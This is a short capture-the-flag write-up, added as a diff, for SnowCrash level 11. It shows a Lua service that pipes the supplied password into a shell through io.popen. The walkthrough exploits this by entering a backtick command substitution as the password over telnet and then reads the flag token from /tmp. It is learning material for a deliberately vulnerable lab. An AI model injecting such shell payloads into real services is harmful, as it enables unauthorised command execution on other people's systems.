@@ -1,0 +1,24 @@
+# Let's analyse the file
+
+level11@SnowCrash:~$ cat level11.lua
+[...]
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+[...]
+
+# Oh well, this is basically a eval on our parameter
+===================================================================
+
+# Let's connect to the server and exploit this
+telnet 127.0.0.1 5151
+
+# We can use ` to execute our code why not run getflag ???
+
+level11@SnowCrash:~$ telnet 127.0.0.1 5151
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Password: `getflag > /tmp/flag`
+Erf nope..
+Connection closed by foreign host.
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
